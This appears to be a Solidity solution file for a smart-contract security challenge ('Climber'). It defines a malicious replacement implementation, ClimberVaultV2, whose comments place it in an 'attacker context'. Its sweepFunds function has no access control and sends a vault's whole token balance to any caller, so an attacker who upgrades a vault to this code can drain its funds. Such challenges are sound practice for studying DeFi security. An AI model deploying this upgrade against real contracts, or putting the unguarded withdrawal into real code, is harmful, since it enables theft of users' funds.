// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

//we are upgrading a UUPS contract, so this contract also needs to inherit from UUPSUpgradeabl
//we also need to override: _authorizeUpgrade => which requires OwnableUpgradeable (onlyOwner)
contract ClimberVaultV2 is OwnableUpgradeable, UUPSUpgradeable { 
    //here, in our attacker context, it does not matter, but in a real upgradeable contract,
    //we need to make sure to keep the same layout for our storage variables and to add new variables to the end
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;
    uint256 private _somethingNew;

    function sweepFunds(IERC20 token) external  {
        require(token.transfer(msg.sender, token.balanceOf(address(this))), "Transfer failed");
    }

    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
}